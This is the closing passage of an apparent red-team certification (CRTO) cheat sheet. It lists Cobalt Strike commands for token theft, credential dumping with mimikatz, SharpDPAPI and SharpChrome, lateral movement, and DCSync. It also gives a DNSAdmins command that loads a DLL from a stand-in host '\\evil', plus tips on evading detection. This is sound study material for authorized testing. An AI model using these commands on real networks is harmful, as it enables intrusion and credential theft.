# Don't inject into protected processes (lsass, etc.)

# Behavioral OPSEC
# Match normal user/admin behavior patterns
# Use legitimate tools and living-off-the-land techniques
# Clean up artifacts and temporary files
```

---

## Quick Reference & Cheat Sheet

### Initial Compromise Workflow
1. `beacon> getuid && whoami /groups` - Check context
2. `beacon> ps` - Look for token theft opportunities
3. `beacon> powerpick Get-ADDomain` - Get domain info
4. `beacon> execute-assembly ADSearch.exe --search "(objectCategory=user)"` - Enumerate users
5. `beacon> steal_token [high-value-PID]` - Escalate if possible

### Credential Access Priority (CRTO Tested)
1. **Token Theft** - `steal_token [PID]` (zero logs, requires high integrity)
2. **DPAPI** - `execute-assembly SharpDPAPI.exe credentials /rpc` (works medium integrity)
3. **Browser** - `execute-assembly SharpChrome.exe logins` (massive cred source)
4. **Kerberos** - `execute-assembly Rubeus.exe asreproast` (no special privs needed)
5. **LSASS** - `mimikatz !sekurlsa::ekeys` (high detection, admin required)

### Lateral Movement Priority (CRTO Success Order)
1. **SCShell64 BOF** - `scshell64 server.corp.local admin pass` (cleanest, in-memory)
2. **WinRM** - `jump winrm64 server.corp.local smb` (standard admin behavior)
3. **PSExec** - `jump psexec64 server.corp.local smb` (works with service accounts)
4. **Manual staging** - When built-in methods fail (see lines 349-367)

### Domain Escalation Options
1. **DCSync** - `beacon> mimikatz !lsadump::dcsync /domain:corp.local /user:krbtgt`
2. **ADCS** - `beacon> execute-assembly Certify.exe find /vulnerable`
3. **DNSAdmins** - `beacon> dnscmd dc01 /config /serverlevelplugindll \\evil\dll`
4. **Delegation** - `beacon> execute-assembly Rubeus.exe s4u /user:...`

---

## Final Notes

This cheatsheet got me through CRTO successfully. Key lessons learned:

1. **Token theft beats credential dumping** - Always check `ps` first before trying to dump LSASS
2. **SCShell64 is the best** - BOF lateral movement is cleaner than traditional jump methods, runs in-memory
3. **OPSEC matters for scoring** - Use PowerShell cmdlets over net commands, beacon built-ins over shell commands
4. **Be methodical** - The 48-hour window is plenty if you work systematically
5. **Focus on the objective** - Everything you do should be aimed at writing that file to the file server

The exam isn't about speed - it's about being thorough and staying undetected. Map the domain properly, find your privilege escalation path, execute carefully, and clean up afterward.

Good luck with CRTO! 🚀

---

## 📖 Additional Resources

### Recommended Reading:
- [MITRE ATT&CK Framework](https://attack.mitre.org/) - Understand adversary techniques
- [Cobalt Strike Documentation](https://www.cobaltstrike.com/help) - Official documentation
- [IRED TEAM](https://www.ired.team/) - Goldmine Blog

### Practice:
- TryHackMe Red Team Path
- VulnHub Red Team Labs
- HackTheBox Pro Labs
- CRTO Official Labs
- Join zero point security Discord servers for discussion
- Follow security researchers on Twitter

---

## 🤝 Contributing

Found an error or have improvements? Possible since some of the commands were picked from the existing repository on internet. Contributions are welcome!

1. Fork this repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly in a lab environment
5. Submit a pull request

---

#### Legal Disclaimer

**This repository is for educational and authorized testing purposes only.**

- Only use these techniques in environments you own or have explicit permission to test
- Unauthorized access to computer systems is illegal
- The author is not responsible for any misuse of this information
- Always follow responsible disclosure practices

- - -


## ⭐ Star History

If this repository helped you with CRTO preparation or red team operations, consider giving it a star!

---

**Happy Red Teaming!** 🔴⚔️
